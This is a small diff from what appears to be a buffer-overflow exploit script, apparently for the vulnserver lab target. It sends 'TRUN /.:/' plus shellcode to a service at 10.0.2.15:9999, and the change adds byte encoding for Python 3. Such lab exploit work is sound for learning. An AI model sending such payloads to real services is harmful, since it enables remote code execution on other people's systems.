@@ -302,7 +302,7 @@ try:
 	s.connect(('10.0.2.15',9999))
 		
 	
-	s.send(("TRUN /.:/" + shellcode))
+	s.send(("TRUN /.:/" + shellcode).encode('latin1'))
 	s.close()
 
 except:
